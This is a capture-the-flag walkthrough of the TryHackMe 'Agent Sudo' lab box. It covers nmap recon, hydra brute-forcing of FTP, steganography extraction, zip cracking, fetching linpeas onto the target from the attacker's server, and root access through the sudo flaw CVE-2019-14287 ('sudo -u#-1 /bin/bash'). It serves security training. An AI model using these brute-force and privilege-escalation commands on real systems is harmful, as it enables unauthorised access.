# TryHackMe Agent Sudo

## Recon

Nmap scan!

````shell

┌──(kali㉿kali)-[~/Documents/AgentSudo]

└─$ sudo nmap -sV -sC -T4 -A -p- 10.10.48.205 -oA scan

````

````Shell
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
````

We found some services: http, ssh, ftp

Lets see we can log in to FTP anon

```shell
┌──(kali㉿kali)-[~/Documents/AgentSudo]

└─$ ftp anonymous@10.10.48.205                    

Connected to 10.10.48.205.

220 (vsFTPd 3.0.3)

331 Please specify the password.

Password:

530 Login incorrect.

ftp: Login failed
````

Nope, check out the website running on port 80, we are greeted with a text page that reads.

````

Dear agents,

Use your own codename as user-agent to access the site.

From,

Agent R

````

Looks like all we have to do is change our User-Agent header to R
I'll do it in Burpsuite
We get this message.

````Shell
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
````

Lets find a different codename, with 26 letters in the alphabet and Agent R being the supervisor.
Each letter is a different agent name.
I started with A and found that using User-Agent: C redirects -- follow redirection on burp.

We get this text

````

Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,

Agent R

````

## Info enumeration

Weak password means we can probably brute force it with something like Hydra.

Before we move on, lets see if agent J has anything on the website.

nothing....

On to brute forcing, lets start with FTP.

````shell
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.48.205
````

Found one

````shell
[21][ftp] host: 10.10.48.205   login: chris   password: crystal
````

Lets see if we can brute the SSH pass as well before moving on.
````shell

hydra -l chris -P /usr/share/wordlists/rockyou.txt ssh://10.10.48.205
````

not getting anywhere, lets explore the ftp server

````shell
 ftp chris@10.10.48.205
````

````shell
ftp> dir

229 Entering Extended Passive Mode (|||34289|)

150 Here comes the directory listing.

-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt

-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg

-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png

226 Directory send OK.

ftp>
````

File list looks interesting, lets download them and see what we can do locally.

````shell

ftp> get "the files"

ftp> exit

````

````shell
┌──(kali㉿kali)-[~/Documents/AgentSudo/ftp]

└─$ ls
cute-alien.jpg  cutie.png  To_agentJ.txt
````

We have two images and a text file, the images make me think of stego but lets checkout To_agentJ.txt first

````shell
┌──(kali㉿kali)-[~/Documents/AgentSudo/ftp]

└─$ cat To_agentJ.txt

Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,

Agent C
````

Yup absolutely gonna be some stego, lets try zsteg on the PNG first.

````shell
└─$ zsteg cutie.png    

[?] 280 bytes of extra data after image end (IEND), offset = 0x8702

extradata:0         .. file: Zip archive data, at least v5.1 to extract, compression method=AES Encrypted
````

Looks like there’s a zip stored within the image. Let’s use binwalk to pull it out

````shell

┌──(kali㉿kali)-[~/Documents/AgentSudo/ftp]

└─$ binwalk -e cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION

--------------------------------------------------------------------------------

0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced

869           0x365           Zlib compressed data, best compression

34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt

34820         0x8804          End of Zip archive, footer length: 22

````

````Shell

┌──(kali㉿kali)-[~/Documents/AgentSudo/ftp/_cutie.png.extracted]

└─$ 7z e 8702.zip

Enter password (will not be echoed):

````

Its protected, we can try to crack with john.

````shell

┌──(kali㉿kali)-[~/Documents/AgentSudo/ftp/_cutie.png.extracted]

└─$ zip2john 8702.zip >> zip.john

````

Default wordlist should be fine

````
┌──(kali㉿kali)-[~/Documents/AgentSudo/ftp/_cutie.png.extracted]

└─$ john zip.john

alien            (8702.zip/To_agentR.txt)
````

Password is alien!

lets extract that zip

````shell
┌──(kali㉿kali)-[~/Documents/AgentSudo/ftp/_cutie.png.extracted]

└─$ 7z e 8702.zip
````

````shell

┌──(kali㉿kali)-[~/Documents/AgentSudo/ftp/_cutie.png.extracted]

└─$ cat To_agentR.txt

Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,

Agent R

````

QXJlYTUx looks like base64, lets decode it.

```shell

┌──(kali㉿kali)-[~/Documents/AgentSudo/ftp/_cutie.png.extracted]

└─$ echo 'QXJlYTUx' | base64 -d

Area51

````

Nice! Maybe this is the password to extract the data out of the other image? We can use steghide.

````shell

┌──(kali㉿kali)-[~/Documents/AgentSudo/ftp]

└─$ steghide extract -sf cute-alien.jpg

Enter passphrase:

wrote extracted data to "message.txt".

````

yup, lets read the message.

```shell

┌──(kali㉿kali)-[~/Documents/AgentSudo/ftp]

└─$ cat message.txt 

Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,

chris

````

Nice, Agent J is James and his password is hackerrules!

We should be able to ssh in with those creds.

````shell

┌──(kali㉿kali)-[~/Documents/AgentSudo/ftp]

└─$ ssh james@10.10.48.205 

james@10.10.48.205's password:

james@agent-sudo:~$

````

## Privilage Escelation

Now we are here, let’s see what sudo perms James has.

````shell

james@agent-sudo:~$ sudo -l

[sudo] password for james:

Matching Defaults entries for james on agent-sudo:

    env_reset, mail_badpass,

    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:

    (ALL, !root) /bin/bash

````

We can probably use bash to privesc, first lets get the user flag.

````shell

james@agent-sudo:~$ cat user_flag.txt

b03d975e8c92a7c04146cfa7a5a313c7

`````

We need to find where the alien picture came from, we could SCP but im just gonna spawn a python

webserver to access the file.

````shell

james@agent-sudo:~$ python3 -m 'http.server'

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

````

````Shell

┌──(kali㉿kali)-[~/Documents/AgentSudo]

└─$ wget http://10.10.79.13:8000/Alien_autospy.jpg

--2023-02-03 09:47:05--  http://10.10.79.13:8000/Alien_autospy.jpg

Connecting to 10.10.79.13:8000... connected.

HTTP request sent, awaiting response... 200 OK

Length: 42189 (41K) [image/jpeg]

Saving to: ‘Alien_autospy.jpg’

Alien_autospy.jpg            100%[==============================================>]  41.20K   173KB/s    in 0.2s   

2023-02-03 09:47:06 (173 KB/s) - ‘Alien_autospy.jpg’ saved [42189/42189]

````

Lets reverse image search it.

im using https://tineye.com/

found the incident: https://www.foxnews.com/science/filmmaker-reveals-how-he-faked-infamous-roswell-alien-autopsy-footage-in-a-london-apartment

Now we must privesc!

lets put linpeas on the box

````shell

┌──(kali㉿kali)-[~/Documents/AgentSudo]

└─$ python3 -m 'http.server'                          

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

````

````shell

james@agent-sudo:~$ wget http://10.6.19.46:8000/linpeas.sh

--2023-02-03 14:56:11--  http://10.6.19.46:8000/linpeas.sh

Connecting to 10.6.19.46:8000... connected.

HTTP request sent, awaiting response... 200 OK

Length: 828098 (809K) [text/x-sh]

Saving to: ‘linpeas.sh’

linpeas.sh                                                 100%[========================================================================================================================================>] 808.69K   957KB/s    in 0.8s   

2023-02-03 14:56:12 (957 KB/s) - ‘linpeas.sh’ saved [828098/828098]

james@agent-sudo:~$

`````

And run it!

I didn't see anything interesting in that, but we did see that james as perms for

   (ALL, !root) /bin/bash

when we ran sudo -l earlier.

exploitDB says CVE-2019-14287 can be used for privesc

lets try sudo -u#-1 /bin/bash

````shell

james@agent-sudo:~$ sudo -u#-1 /bin/bash

root@agent-sudo:~# whoami

root

root@agent-sudo:~#

````

We got root!

## Root

root flag

````

root@agent-sudo:/root# cat root.txt

To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.

Your flag is

b53a02f55b57d4439e3341834d70c062

By,

DesKel a.k.a Agent R

root@agent-sudo:/root#

````

Very straightforeword box, classic issues and easy privesc.